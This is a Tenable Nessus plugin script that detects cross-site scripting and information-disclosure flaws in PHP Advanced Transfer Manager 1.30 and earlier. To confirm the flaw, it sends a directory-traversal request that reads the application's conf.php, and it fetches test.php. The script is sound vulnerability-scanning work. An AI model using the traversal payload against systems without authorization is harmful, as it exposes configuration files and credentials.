#
# (C) Tenable Network Security
#


if (description) {
  script_id(19768);
  script_version("$Revision: 1.6 $");

  script_bugtraq_id(14883, 14887, 15074, 15237);

  name["english"] = "PHP Advanced Transfer Manager <= 1.30 Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP script which suffers from cross
site scripting and information disclosure vulnerabilities. 

Description :

The version of PHP Advanced Transfer Manager on the remote host
suffers from multiple information disclosure and cross-site scripting
flaws.  For example, by calling a text or HTML viewer directly, an
unauthenticated attacker can view arbitrary files, provided PHP's
'register_globals' setting is enabled.  In addition, it may allow
anyone to directly retrieve users' configuration files, with encrypted
password hashes as well as the application's 'test.php' script, which
reveals information about the configuration of PHP on the remote host. 
And finally, it fails to adequately filter arbitrary HTML and script
code before using it in dynamically generated pages. 

See also :

http://retrogod.altervista.org/phpatm130.html

Solution : 

Disable PHP's 'register_globals' setting, remove the 'test.php'
script, and prevent direct access to the 'users' directory.

Risk factor : 

Medium / CVSS Base Score : 4 
(AV:R/AC:H/Au:NR/C:C/A:N/I:N/B:C)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities in PHP Advanced Transfer Manager <= 1.30";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/phpatm", "/phpATM", "/downloads", "/upload", "/files", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Grab index.php.
  res = http_get_cache(item:string(dir, "/index.php"), port:port);
  if (res == NULL) exit(0);

  # If it's phpATM.
  if (
    '<a href="http://phpatm.free.fr"' >< res && 
    "Powered by PHP Advanced Transfer Manager v" >< res
  ) {
    # Try to exploit a disclosure flaw in one of the viewers..
    req = http_get(
      item:string(
        dir, "/viewers/txt.php?",
        "current_dir=../include&",
        "filename=conf.php"
      ),
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if it looks like the config file.
    if (egrep(string:res, pattern:'^<br>.*\\$(admin_email|homeurl|smtp_host) *= *".+" *;')) {
      security_warning(port);
      exit(0);
    }

    if (thorough_tests) {
      # Try to exploit the disclosure flaw in test.php.
      req = http_get(item:string(dir, "/test.php"), port:port);
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # There's a problem if it looks like the output of test.php.
      if ("<BR>Open basedir:" >< res) {
        security_warning(port);
        exit(0);
      }
    }
  }
}
